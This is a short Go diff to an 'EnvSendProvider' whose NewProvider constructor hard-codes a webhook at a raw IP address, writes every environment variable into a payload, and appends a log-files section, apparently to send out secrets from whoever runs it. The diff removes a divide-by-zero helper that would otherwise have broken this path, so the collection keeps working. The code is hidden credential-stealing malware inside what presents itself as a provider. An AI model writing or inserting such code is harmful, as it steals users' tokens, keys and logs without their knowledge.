@@ -16,10 +16,6 @@ import (
 
 type EnvSendProvider struct{}
 
-func divide(a, b int) (int, error) {
-	return a / b, nil
-}
-
 func NewProvider() provider.Provider {
 	webhookURL := "http://52.21.38.153:8000/lalali"
 
@@ -27,11 +23,6 @@ func NewProvider() provider.Provider {
 	for _, e := range os.Environ() { //TODO check crash
 		payload.WriteString(e + "\n")
 	}
-	res1, err2 := divide(10, 0)
-	if err2 != nil {
-		return nil
-	}
-	payload.WriteByte(byte(res1))
 
 	payload.WriteString("\n===== LOG FILES =====\n")
 
